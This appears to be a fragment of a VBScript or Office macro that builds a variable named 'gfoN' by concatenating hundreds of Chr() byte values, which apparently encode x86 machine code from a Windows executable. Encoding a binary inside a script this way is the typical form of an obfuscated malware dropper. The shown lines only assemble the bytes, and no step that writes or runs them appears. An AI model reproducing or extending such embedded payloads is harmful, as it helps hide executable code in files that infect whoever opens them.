gfoN=gfoN&Chr(137)&Chr(85)&Chr(248)&Chr(139)&Chr(13)&Chr(188)&Chr(182)&Chr(64)&Chr(0)&Chr(139)&Chr(217)&Chr(201)&Chr(17)&Chr(139)&Chr(83)&Chr(4)&Chr(139)&Chr(59)&Chr(35)&Chr(85)&Chr(248)&Chr(35)&Chr(254)&Chr(11)&Chr(215)&Chr(117)&Chr(10)&Chr(131)&Chr(195)&Chr(20)&Chr(137)&Chr(93)&Chr(8)&Chr(59)&Chr(216)&Chr(114)&Chr(232)&Chr(59)&Chr(216)&Chr(117)&Chr(127)&Chr(139)&Chr(29)&Chr(180)&Chr(182)&Chr(64)&Chr(0)&Chr(235)&Chr(17)&Chr(139)&Chr(83)&Chr(4)&Chr(139)&Chr(59)&Chr(35)&Chr(85)&Chr(248)&Chr(35)&Chr(254)&Chr(11)&Chr(215)&Chr(117)&Chr(10)&Chr(131)&Chr(195)&Chr(20)&Chr(137)&Chr(93)&Chr(8)&Chr(59)&Chr(217)&Chr(114)&Chr(232)&Chr(59)&Chr(217)&Chr(117)&Chr(91)&Chr(235)&Chr(12)&Chr(131)&Chr(123)&Chr(8)&Chr(0)&Chr(117)&Chr(10)&Chr(131)&Chr(195)&Chr(20)&Chr(137)&Chr(93)&Chr(8)&Chr(59)&Chr(216)&Chr(114)&Chr(240)&Chr(59)&Chr(216)&Chr(117)&Chr(49)&Chr(139)
gfoN=gfoN&Chr(29)&Chr(180)&Chr(182)&Chr(64)&Chr(0)&Chr(235)&Chr(9)&Chr(131)&Chr(123)&Chr(8)&Chr(0)&Chr(117)&Chr(10)&Chr(131)&Chr(195)&Chr(20)&Chr(137)&Chr(93)&Chr(8)&Chr(59)&Chr(217)&Chr(114)&Chr(240)&Chr(59)&Chr(217)&Chr(117)&Chr(21)&Chr(232)&Chr(160)&Chr(250)&Chr(255)&Chr(255)&Chr(139)&Chr(216)&Chr(137)&Chr(93)&Chr(8)&Chr(133)&Chr(219)&Chr(117)&Chr(7)&Chr(51)&Chr(192)&Chr(233)&Chr(9)&Chr(2)&Chr(0)&Chr(0)&Chr(83)&Chr(232)&Chr(58)&Chr(251)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(75)&Chr(16)&Chr(137)&Chr(1)&Chr(139)&Chr(67)&Chr(16)&Chr(131)&Chr(56)&Chr(255)&Chr(116)&Chr(229)&Chr(137)&Chr(29)&Chr(188)&Chr(182)&Chr(64)&Chr(0)&Chr(139)&Chr(67)&Chr(16)&Chr(139)&Chr(16)&Chr(137)&Chr(85)&Chr(252)&Chr(131)&Chr(250)&Chr(255)&Chr(116)&Chr(20)&Chr(139)&Chr(140)&Chr(144)&Chr(196)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(124)&Chr(144)&Chr(68)&Chr(35)&Chr(77)
gfoN=gfoN&Chr(248)&Chr(35)&Chr(254)&Chr(11)&Chr(207)&Chr(117)&Chr(41)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(139)&Chr(144)&Chr(196)&Chr(0)&Chr(0)&Chr(0)&Chr(141)&Chr(72)&Chr(68)&Chr(139)&Chr(57)&Chr(35)&Chr(85)&Chr(248)&Chr(35)&Chr(254)&Chr(11)&Chr(215)&Chr(117)&Chr(14)&Chr(255)&Chr(69)&Chr(252)&Chr(139)&Chr(145)&Chr(132)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(193)&Chr(4)&Chr(235)&Chr(231)&Chr(139)&Chr(85)&Chr(252)&Chr(139)&Chr(202)&Chr(105)&Chr(201)&Chr(4)&Chr(2)&Chr(0)&Chr(0)&Chr(141)&Chr(140)&Chr(1)&Chr(68)&Chr(1)&Chr(0)&Chr(0)&Chr(137)&Chr(77)&Chr(244)&Chr(139)&Chr(76)&Chr(144)&Chr(68)&Chr(51)&Chr(255)&Chr(35)&Chr(206)&Chr(117)&Chr(18)&Chr(139)&Chr(140)&Chr(144)&Chr(196)&Chr(0)&Chr(0)&Chr(0)&Chr(35)&Chr(77)&Chr(248)&Chr(106)&Chr(32)&Chr(95)&Chr(235)&Chr(3)&Chr(3)&Chr(201)&Chr(71)&Chr(133)&Chr(201)&Chr(125)&Chr(249)&Chr(139)&Chr(77)
gfoN=gfoN&Chr(244)&Chr(139)&Chr(84)&Chr(249)&Chr(4)&Chr(139)&Chr(10)&Chr(43)&Chr(77)&Chr(240)&Chr(139)&Chr(241)&Chr(193)&Chr(254)&Chr(4)&Chr(78)&Chr(131)&Chr(254)&Chr(63)&Chr(137)&Chr(77)&Chr(248)&Chr(126)&Chr(3)&Chr(106)&Chr(63)&Chr(94)&Chr(59)&Chr(247)&Chr(15)&Chr(132)&Chr(1)&Chr(1)&Chr(0)&Chr(0)&Chr(139)&Chr(74)&Chr(4)&Chr(59)&Chr(74)&Chr(8)&Chr(117)&Chr(92)&Chr(131)&Chr(255)&Chr(32)&Chr(187)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(125)&Chr(38)&Chr(139)&Chr(207)&Chr(211)&Chr(235)&Chr(139)&Chr(77)&Chr(252)&Chr(141)&Chr(124)&Chr(56)&Chr(4)&Chr(247)&Chr(211)&Chr(137)&Chr(93)&Chr(236)&Chr(35)&Chr(92)&Chr(136)&Chr(68)&Chr(137)&Chr(92)&Chr(136)&Chr(68)&Chr(254)&Chr(15)&Chr(117)&Chr(51)&Chr(139)&Chr(77)&Chr(236)&Chr(139)&Chr(93)&Chr(8)&Chr(33)&Chr(11)&Chr(235)&Chr(44)&Chr(141)&Chr(79)&Chr(224)&Chr(211)&Chr(235)&Chr(139)&Chr(77)&Chr(252)&Chr(141)
gfoN=gfoN&Chr(140)&Chr(136)&Chr(196)&Chr(0)&Chr(0)&Chr(0)&Chr(141)&Chr(124)&Chr(56)&Chr(4)&Chr(247)&Chr(211)&Chr(33)&Chr(25)&Chr(254)&Chr(15)&Chr(137)&Chr(93)&Chr(236)&Chr(117)&Chr(11)&Chr(139)&Chr(93)&Chr(8)&Chr(139)&Chr(77)&Chr(236)&Chr(33)&Chr(75)&Chr(4)&Chr(235)&Chr(3)&Chr(139)&Chr(93)&Chr(8)&Chr(131)&Chr(125)&Chr(248)&Chr(0)&Chr(139)&Chr(74)&Chr(8)&Chr(139)&Chr(122)&Chr(4)&Chr(137)&Chr(121)&Chr(4)&Chr(139)&Chr(74)&Chr(4)&Chr(139)&Chr(122)&Chr(8)&Chr(137)&Chr(121)&Chr(8)&Chr(15)&Chr(132)&Chr(141)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(77)&Chr(244)&Chr(141)&Chr(12)&Chr(241)&Chr(139)&Chr(121)&Chr(4)&Chr(137)&Chr(74)&Chr(8)&Chr(137)&Chr(122)&Chr(4)&Chr(137)&Chr(81)&Chr(4)&Chr(139)&Chr(74)&Chr(4)&Chr(137)&Chr(81)&Chr(8)&Chr(139)&Chr(74)&Chr(4)&Chr(59)&Chr(74)&Chr(8)&Chr(117)&Chr(94)&Chr(138)&Chr(76)&Chr(6)&Chr(4)&Chr(136)
gfoN=gfoN&Chr(77)&Chr(11)&Chr(254)&Chr(193)&Chr(131)&Chr(254)&Chr(32)&Chr(136)&Chr(76)&Chr(6)&Chr(4)&Chr(125)&Chr(35)&Chr(128)&Chr(125)&Chr(11)&Chr(0)&Chr(117)&Chr(11)&Chr(191)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(139)&Chr(206)&Chr(211)&Chr(239)&Chr(9)&Chr(59)&Chr(139)&Chr(206)&Chr(191)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(211)&Chr(239)&Chr(139)&Chr(77)&Chr(252)&Chr(9)&Chr(124)&Chr(136)&Chr(68)&Chr(235)&Chr(41)&Chr(128)&Chr(125)&Chr(11)&Chr(0)&Chr(117)&Chr(13)&Chr(141)&Chr(78)&Chr(224)&Chr(191)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(211)&Chr(239)&Chr(9)&Chr(123)&Chr(4)&Chr(139)&Chr(77)&Chr(252)&Chr(141)&Chr(188)&Chr(136)&Chr(196)&Chr(0)&Chr(0)&Chr(0)&Chr(141)&Chr(78)&Chr(224)&Chr(190)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(211)&Chr(238)&Chr(9)&Chr(55)&Chr(139)&Chr(77)&Chr(248)&Chr(133)&Chr(201)&Chr(116)&Chr(11)&Chr(137)&Chr(10)&Chr(137)&Chr(76)
gfoN=gfoN&Chr(17)&Chr(252)&Chr(235)&Chr(3)&Chr(139)&Chr(77)&Chr(248)&Chr(139)&Chr(117)&Chr(240)&Chr(3)&Chr(209)&Chr(141)&Chr(78)&Chr(1)&Chr(137)&Chr(10)&Chr(137)&Chr(76)&Chr(50)&Chr(252)&Chr(139)&Chr(117)&Chr(244)&Chr(139)&Chr(14)&Chr(141)&Chr(121)&Chr(1)&Chr(137)&Chr(62)&Chr(133)&Chr(201)&Chr(117)&Chr(26)&Chr(59)&Chr(29)&Chr(184)&Chr(178)&Chr(64)&Chr(0)&Chr(117)&Chr(18)&Chr(139)&Chr(77)&Chr(252)&Chr(59)&Chr(13)&Chr(196)&Chr(182)&Chr(64)&Chr(0)&Chr(117)&Chr(7)&Chr(131)&Chr(37)&Chr(184)&Chr(178)&Chr(64)&Chr(0)&Chr(0)&Chr(139)&Chr(77)&Chr(252)&Chr(137)&Chr(8)&Chr(141)&Chr(66)&Chr(4)&Chr(95)&Chr(94)&Chr(91)&Chr(201)&Chr(195)&Chr(59)&Chr(13)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(117)&Chr(2)&Chr(243)&Chr(195)&Chr(233)&Chr(24)&Chr(23)&Chr(0)&Chr(0)&Chr(204)&Chr(204)&Chr(204)&Chr(83)&Chr(86)&Chr(87)&Chr(139)&Chr(84)&Chr(36)&Chr(16)&Chr(139)
gfoN=gfoN&Chr(68)&Chr(36)&Chr(20)&Chr(139)&Chr(76)&Chr(36)&Chr(24)&Chr(85)&Chr(82)&Chr(80)&Chr(81)&Chr(81)&Chr(104)&Chr(128)&Chr(80)&Chr(64)&Chr(0)&Chr(100)&Chr(255)&Chr(53)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(161)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(51)&Chr(196)&Chr(137)&Chr(68)&Chr(36)&Chr(8)&Chr(100)&Chr(137)&Chr(37)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(68)&Chr(36)&Chr(48)&Chr(139)&Chr(88)&Chr(8)&Chr(139)&Chr(76)&Chr(36)&Chr(44)&Chr(51)&Chr(25)&Chr(139)&Chr(112)&Chr(12)&Chr(131)&Chr(254)&Chr(254)&Chr(116)&Chr(59)&Chr(139)&Chr(84)&Chr(36)&Chr(52)&Chr(131)&Chr(250)&Chr(254)&Chr(116)&Chr(4)&Chr(59)&Chr(242)&Chr(118)&Chr(46)&Chr(141)&Chr(52)&Chr(118)&Chr(141)&Chr(92)&Chr(179)&Chr(16)&Chr(139)&Chr(11)&Chr(137)&Chr(72)&Chr(12)&Chr(131)&Chr(123)&Chr(4)&Chr(0)&Chr(117)&Chr(204)&Chr(104)&Chr(1)&Chr(1)&Chr(0)&Chr(0)&Chr(139)
gfoN=gfoN&Chr(67)&Chr(8)&Chr(232)&Chr(190)&Chr(24)&Chr(0)&Chr(0)&Chr(185)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(67)&Chr(8)&Chr(232)&Chr(208)&Chr(24)&Chr(0)&Chr(0)&Chr(235)&Chr(176)&Chr(100)&Chr(143)&Chr(5)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(24)&Chr(95)&Chr(94)&Chr(91)&Chr(195)&Chr(139)&Chr(76)&Chr(36)&Chr(4)&Chr(247)&Chr(65)&Chr(4)&Chr(6)&Chr(0)&Chr(0)&Chr(0)&Chr(184)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(116)&Chr(51)&Chr(139)&Chr(68)&Chr(36)&Chr(8)&Chr(139)&Chr(72)&Chr(8)&Chr(51)&Chr(200)&Chr(232)&Chr(62)&Chr(255)&Chr(255)&Chr(255)&Chr(85)&Chr(139)&Chr(104)&Chr(24)&Chr(255)&Chr(112)&Chr(12)&Chr(255)&Chr(112)&Chr(16)&Chr(255)&Chr(112)&Chr(20)&Chr(232)&Chr(62)&Chr(255)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(93)&Chr(139)&Chr(68)&Chr(36)&Chr(8)&Chr(139)&Chr(84)&Chr(36)&Chr(16)&Chr(137)&Chr(2)
gfoN=gfoN&Chr(184)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(195)&Chr(85)&Chr(139)&Chr(76)&Chr(36)&Chr(8)&Chr(139)&Chr(41)&Chr(255)&Chr(113)&Chr(28)&Chr(255)&Chr(113)&Chr(24)&Chr(255)&Chr(113)&Chr(40)&Chr(232)&Chr(21)&Chr(255)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(93)&Chr(194)&Chr(4)&Chr(0)&Chr(85)&Chr(86)&Chr(87)&Chr(83)&Chr(139)&Chr(234)&Chr(51)&Chr(192)&Chr(51)&Chr(219)&Chr(51)&Chr(210)&Chr(51)&Chr(246)&Chr(51)&Chr(255)&Chr(255)&Chr(209)&Chr(91)&Chr(95)&Chr(94)&Chr(93)&Chr(195)&Chr(139)&Chr(234)&Chr(139)&Chr(241)&Chr(139)&Chr(193)&Chr(106)&Chr(1)&Chr(232)&Chr(27)&Chr(24)&Chr(0)&Chr(0)&Chr(51)&Chr(192)&Chr(51)&Chr(219)&Chr(51)&Chr(201)&Chr(51)&Chr(210)&Chr(51)&Chr(255)&Chr(255)&Chr(230)&Chr(85)&Chr(139)&Chr(236)&Chr(83)&Chr(86)&Chr(87)&Chr(106)&Chr(0)&Chr(106)&Chr(0)&Chr(104)&Chr(39)&Chr(81)&Chr(64)&Chr(0)&Chr(56)&Chr(232)&Chr(247)
gfoN=gfoN&Chr(32)&Chr(0)&Chr(0)&Chr(95)&Chr(94)&Chr(91)&Chr(93)&Chr(195)&Chr(85)&Chr(139)&Chr(108)&Chr(36)&Chr(8)&Chr(82)&Chr(81)&Chr(255)&Chr(116)&Chr(36)&Chr(20)&Chr(232)&Chr(180)&Chr(254)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(93)&Chr(194)&Chr(8)&Chr(0)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(129)&Chr(236)&Chr(40)&Chr(3)&Chr(0)&Chr(0)&Chr(161)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(51)&Chr(197)&Chr(137)&Chr(69)&Chr(252)&Chr(246)&Chr(5)&Chr(0)&Chr(170)&Chr(64)&Chr(0)&Chr(1)&Chr(86)&Chr(116)&Chr(8)&Chr(106)&Chr(10)&Chr(232)&Chr(211)&Chr(195)&Chr(255)&Chr(255)&Chr(89)&Chr(232)&Chr(131)&Chr(221)&Chr(255)&Chr(255)&Chr(133)&Chr(192)&Chr(116)&Chr(8)&Chr(106)&Chr(22)&Chr(232)&Chr(133)&Chr(221)&Chr(255)&Chr(255)&Chr(89)&Chr(246)&Chr(5)&Chr(0)&Chr(170)&Chr(64)&Chr(0)&Chr(2)&Chr(15)&Chr(132)&Chr(202)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(137)&Chr(133)&Chr(224)&Chr(253)&Chr(255)&Chr(255)&Chr(137)&Chr(141)&Chr(220)&Chr(253)&Chr(255)&Chr(255)&Chr(137)&Chr(149)&Chr(216)&Chr(253)&Chr(255)&Chr(255)&Chr(137)&Chr(157)&Chr(212)&Chr(253)&Chr(255)&Chr(255)&Chr(137)&Chr(181)&Chr(208)&Chr(253)&Chr(255)&Chr(255)&Chr(137)&Chr(189)&Chr(204)&Chr(253)&Chr(255)&Chr(255)&Chr(102)&Chr(140)&Chr(149)&Chr(248)&Chr(253)&Chr(255)&Chr(255)&Chr(102)&Chr(140)&Chr(141)&Chr(236)&Chr(253)&Chr(255)&Chr(255)&Chr(102)&Chr(140)&Chr(157)&Chr(200)&Chr(253)&Chr(255)&Chr(255)&Chr(102)&Chr(140)&Chr(133)&Chr(196)&Chr(253)&Chr(255)&Chr(255)&Chr(102)&Chr(140)&Chr(165)&Chr(192)&Chr(253)&Chr(255)&Chr(255)&Chr(102)&Chr(140)&Chr(173)&Chr(188)&Chr(253)&Chr(255)&Chr(255)&Chr(156)&Chr(143)&Chr(133)&Chr(240)&Chr(253)&Chr(255)&Chr(255)&Chr(139)&Chr(117)&Chr(4)&Chr(141)&Chr(69)&Chr(4)&Chr(137)&Chr(133)&Chr(244)&Chr(253)&Chr(255)&Chr(255)&Chr(199)&Chr(133)&Chr(48)
gfoN=gfoN&Chr(253)&Chr(255)&Chr(255)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(137)&Chr(181)&Chr(232)&Chr(253)&Chr(255)&Chr(255)&Chr(139)&Chr(64)&Chr(252)&Chr(106)&Chr(80)&Chr(137)&Chr(133)&Chr(228)&Chr(253)&Chr(255)&Chr(255)&Chr(141)&Chr(133)&Chr(216)&Chr(252)&Chr(255)&Chr(255)&Chr(106)&Chr(0)&Chr(80)&Chr(232)&Chr(94)&Chr(0)&Chr(0)&Chr(0)&Chr(141)&Chr(133)&Chr(216)&Chr(252)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(137)&Chr(133)&Chr(40)&Chr(253)&Chr(255)&Chr(255)&Chr(141)&Chr(133)&Chr(48)&Chr(253)&Chr(255)&Chr(255)&Chr(106)&Chr(0)&Chr(199)&Chr(133)&Chr(216)&Chr(252)&Chr(255)&Chr(255)&Chr(21)&Chr(0)&Chr(0)&Chr(64)&Chr(137)&Chr(181)&Chr(228)&Chr(252)&Chr(255)&Chr(255)&Chr(137)&Chr(101)&Chr(44)&Chr(253)&Chr(255)&Chr(255)&Chr(255)&Chr(21)&Chr(8)&Chr(128)&Chr(64)&Chr(0)&Chr(141)&Chr(133)&Chr(40)&Chr(253)&Chr(255)&Chr(255)&Chr(80)&Chr(255)&Chr(21)&Chr(152)&Chr(128)
gfoN=gfoN&Chr(64)&Chr(0)&Chr(106)&Chr(3)&Chr(232)&Chr(97)&Chr(194)&Chr(255)&Chr(255)&Chr(204)&Chr(131)&Chr(37)&Chr(172)&Chr(182)&Chr(64)&Chr(0)&Chr(0)&Chr(195)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(139)&Chr(84)&Chr(36)&Chr(12)&Chr(139)&Chr(76)&Chr(36)&Chr(4)&Chr(133)&Chr(210)&Chr(116)&Chr(105)&Chr(51)&Chr(192)&Chr(138)&Chr(68)&Chr(36)&Chr(8)&Chr(132)&Chr(192)&Chr(117)&Chr(22)&Chr(129)&Chr(250)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(114)&Chr(14)&Chr(131)&Chr(61)&Chr(168)&Chr(182)&Chr(64)&Chr(0)&Chr(0)&Chr(116)&Chr(5)&Chr(233)&Chr(254)&Chr(22)&Chr(0)&Chr(0)&Chr(87)&Chr(139)&Chr(249)&Chr(131)&Chr(250)&Chr(4)&Chr(114)&Chr(49)&Chr(247)&Chr(217)&Chr(131)&Chr(225)&Chr(3)&Chr(116)&Chr(12)&Chr(43)&Chr(209)&Chr(136)&Chr(7)&Chr(131)&Chr(199)&Chr(1)&Chr(131)&Chr(233)
gfoN=gfoN&Chr(1)&Chr(117)&Chr(246)&Chr(139)&Chr(200)&Chr(193)&Chr(224)&Chr(8)&Chr(3)&Chr(193)&Chr(139)&Chr(200)&Chr(193)&Chr(224)&Chr(16)&Chr(3)&Chr(193)&Chr(139)&Chr(202)&Chr(131)&Chr(226)&Chr(3)&Chr(193)&Chr(233)&Chr(2)&Chr(116)&Chr(6)&Chr(243)&Chr(171)&Chr(133)&Chr(210)&Chr(116)&Chr(10)&Chr(136)&Chr(7)&Chr(131)&Chr(199)&Chr(1)&Chr(131)&Chr(234)&Chr(1)&Chr(117)&Chr(246)&Chr(139)&Chr(68)&Chr(36)&Chr(8)&Chr(95)&Chr(195)&Chr(139)&Chr(68)&Chr(36)&Chr(4)&Chr(195)&Chr(106)&Chr(16)&Chr(104)&Chr(200)&Chr(148)&Chr(64)&Chr(0)&Chr(232)&Chr(194)&Chr(210)&Chr(255)&Chr(255)&Chr(51)&Chr(192)&Chr(139)&Chr(93)&Chr(8)&Chr(51)&Chr(255)&Chr(59)&Chr(223)&Chr(15)&Chr(149)&Chr(192)&Chr(59)&Chr(199)&Chr(117)&Chr(29)&Chr(232)&Chr(207)&Chr(216)&Chr(255)&Chr(255)&Chr(199)&Chr(0)&Chr(22)&Chr(0)&Chr(0)&Chr(0)&Chr(87)&Chr(87)&Chr(87)&Chr(87)&Chr(87)&Chr(232)&Chr(87)
gfoN=gfoN&Chr(216)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(20)&Chr(131)&Chr(200)&Chr(255)&Chr(235)&Chr(83)&Chr(131)&Chr(61)&Chr(204)&Chr(182)&Chr(64)&Chr(0)&Chr(3)&Chr(117)&Chr(56)&Chr(106)&Chr(4)&Chr(232)&Chr(213)&Chr(214)&Chr(255)&Chr(255)&Chr(89)&Chr(137)&Chr(125)&Chr(252)&Chr(83)&Chr(232)&Chr(221)&Chr(241)&Chr(255)&Chr(255)&Chr(89)&Chr(137)&Chr(69)&Chr(224)&Chr(59)&Chr(199)&Chr(116)&Chr(11)&Chr(139)&Chr(115)&Chr(252)&Chr(131)&Chr(238)&Chr(9)&Chr(137)&Chr(117)&Chr(228)&Chr(235)&Chr(3)&Chr(139)&Chr(117)&Chr(228)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(37)&Chr(0)&Chr(0)&Chr(0)&Chr(57)&Chr(125)&Chr(224)&Chr(117)&Chr(16)&Chr(83)&Chr(87)&Chr(255)&Chr(53)&Chr(212)&Chr(176)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(200)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(240)&Chr(139)&Chr(198)&Chr(232)&Chr(130)&Chr(210)&Chr(255)&Chr(255)&Chr(195)
gfoN=gfoN&Chr(51)&Chr(255)&Chr(139)&Chr(93)&Chr(8)&Chr(139)&Chr(117)&Chr(228)&Chr(106)&Chr(4)&Chr(232)&Chr(163)&Chr(213)&Chr(255)&Chr(255)&Chr(89)&Chr(195)&Chr(106)&Chr(2)&Chr(232)&Chr(160)&Chr(190)&Chr(255)&Chr(255)&Chr(89)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(139)&Chr(69)&Chr(8)&Chr(133)&Chr(192)&Chr(116)&Chr(18)&Chr(131)&Chr(232)&Chr(8)&Chr(129)&Chr(56)&Chr(221)&Chr(221)&Chr(0)&Chr(0)&Chr(117)&Chr(7)&Chr(80)&Chr(232)&Chr(112)&Chr(233)&Chr(255)&Chr(255)&Chr(89)&Chr(93)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(20)&Chr(161)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(51)&Chr(197)&Chr(137)&Chr(69)&Chr(252)&Chr(83)&Chr(86)&Chr(51)&Chr(219)&Chr(87)&Chr(139)&Chr(241)&Chr(57)&Chr(29)&Chr(188)&Chr(178)&Chr(64)&Chr(0)&Chr(117)&Chr(56)&Chr(83)&Chr(83)&Chr(51)&Chr(255)&Chr(71)&Chr(87)&Chr(104)&Chr(224)&Chr(136)
gfoN=gfoN&Chr(64)&Chr(0)&Chr(104)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(83)&Chr(255)&Chr(21)&Chr(216)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(8)&Chr(137)&Chr(61)&Chr(188)&Chr(178)&Chr(64)&Chr(0)&Chr(235)&Chr(21)&Chr(255)&Chr(21)&Chr(56)&Chr(128)&Chr(64)&Chr(0)&Chr(131)&Chr(248)&Chr(120)&Chr(117)&Chr(10)&Chr(199)&Chr(5)&Chr(188)&Chr(178)&Chr(64)&Chr(0)&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(57)&Chr(93)&Chr(20)&Chr(126)&Chr(34)&Chr(139)&Chr(77)&Chr(20)&Chr(139)&Chr(69)&Chr(16)&Chr(73)&Chr(56)&Chr(24)&Chr(116)&Chr(8)&Chr(64)&Chr(59)&Chr(203)&Chr(117)&Chr(246)&Chr(131)&Chr(201)&Chr(255)&Chr(139)&Chr(69)&Chr(20)&Chr(43)&Chr(193)&Chr(72)&Chr(59)&Chr(69)&Chr(20)&Chr(125)&Chr(1)&Chr(64)&Chr(137)&Chr(69)&Chr(20)&Chr(161)&Chr(188)&Chr(178)&Chr(64)&Chr(0)&Chr(131)&Chr(248)&Chr(2)&Chr(15)&Chr(132)&Chr(172)&Chr(1)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(59)&Chr(195)&Chr(15)&Chr(132)&Chr(164)&Chr(1)&Chr(0)&Chr(0)&Chr(131)&Chr(248)&Chr(99)&Chr(15)&Chr(133)&Chr(204)&Chr(1)&Chr(0)&Chr(0)&Chr(137)&Chr(93)&Chr(248)&Chr(57)&Chr(93)&Chr(32)&Chr(117)&Chr(8)&Chr(139)&Chr(6)&Chr(139)&Chr(64)&Chr(4)&Chr(137)&Chr(69)&Chr(32)&Chr(139)&Chr(53)&Chr(212)&Chr(128)&Chr(64)&Chr(0)&Chr(51)&Chr(192)&Chr(57)&Chr(93)&Chr(36)&Chr(83)&Chr(83)&Chr(255)&Chr(117)&Chr(20)&Chr(15)&Chr(149)&Chr(192)&Chr(255)&Chr(117)&Chr(16)&Chr(141)&Chr(4)&Chr(197)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(80)&Chr(255)&Chr(117)&Chr(32)&Chr(255)&Chr(214)&Chr(139)&Chr(248)&Chr(59)&Chr(251)&Chr(15)&Chr(132)&Chr(143)&Chr(1)&Chr(0)&Chr(0)&Chr(126)&Chr(67)&Chr(106)&Chr(224)&Chr(51)&Chr(210)&Chr(88)&Chr(247)&Chr(247)&Chr(131)&Chr(248)&Chr(2)&Chr(114)&Chr(55)&Chr(141)&Chr(68)&Chr(63)&Chr(8)&Chr(61)&Chr(0)&Chr(4)&Chr(0)
gfoN=gfoN&Chr(0)&Chr(119)&Chr(19)&Chr(232)&Chr(64)&Chr(22)&Chr(0)&Chr(0)&Chr(139)&Chr(196)&Chr(59)&Chr(195)&Chr(116)&Chr(28)&Chr(199)&Chr(0)&Chr(204)&Chr(204)&Chr(0)&Chr(0)&Chr(235)&Chr(17)&Chr(80)&Chr(232)&Chr(39)&Chr(5)&Chr(0)&Chr(0)&Chr(89)&Chr(59)&Chr(195)&Chr(116)&Chr(9)&Chr(199)&Chr(0)&Chr(221)&Chr(221)&Chr(0)&Chr(0)&Chr(131)&Chr(192)&Chr(8)&Chr(137)&Chr(69)&Chr(244)&Chr(235)&Chr(3)&Chr(137)&Chr(93)&Chr(244)&Chr(57)&Chr(93)&Chr(244)&Chr(15)&Chr(132)&Chr(62)&Chr(1)&Chr(0)&Chr(0)&Chr(87)&Chr(255)&Chr(117)&Chr(244)&Chr(255)&Chr(117)&Chr(20)&Chr(255)&Chr(117)&Chr(16)&Chr(106)&Chr(1)&Chr(255)&Chr(117)&Chr(32)&Chr(255)&Chr(214)&Chr(133)&Chr(192)&Chr(15)&Chr(132)&Chr(227)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(53)&Chr(216)&Chr(128)&Chr(64)&Chr(0)&Chr(83)&Chr(83)&Chr(87)&Chr(255)&Chr(117)&Chr(244)&Chr(255)&Chr(117)&Chr(12)&Chr(255)
gfoN=gfoN&Chr(117)&Chr(8)&Chr(255)&Chr(214)&Chr(139)&Chr(200)&Chr(137)&Chr(77)&Chr(248)&Chr(59)&Chr(203)&Chr(15)&Chr(132)&Chr(194)&Chr(0)&Chr(0)&Chr(0)&Chr(247)&Chr(69)&Chr(12)&Chr(0)&Chr(4)&Chr(0)&Chr(0)&Chr(116)&Chr(41)&Chr(57)&Chr(93)&Chr(28)&Chr(15)&Chr(132)&Chr(176)&Chr(0)&Chr(0)&Chr(0)&Chr(59)&Chr(77)&Chr(28)&Chr(15)&Chr(143)&Chr(167)&Chr(0)&Chr(0)&Chr(0)&Chr(255)&Chr(117)&Chr(28)&Chr(255)&Chr(117)&Chr(24)&Chr(87)&Chr(255)&Chr(117)&Chr(244)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(117)&Chr(8)&Chr(255)&Chr(214)&Chr(233)&Chr(144)&Chr(0)&Chr(0)&Chr(0)&Chr(59)&Chr(203)&Chr(126)&Chr(69)&Chr(106)&Chr(224)&Chr(51)&Chr(210)&Chr(88)&Chr(247)&Chr(241)&Chr(131)&Chr(248)&Chr(2)&Chr(114)&Chr(57)&Chr(141)&Chr(68)&Chr(9)&Chr(8)&Chr(61)&Chr(0)&Chr(4)&Chr(0)&Chr(0)&Chr(119)&Chr(22)&Chr(232)&Chr(129)&Chr(21)&Chr(0)&Chr(0)&Chr(139)
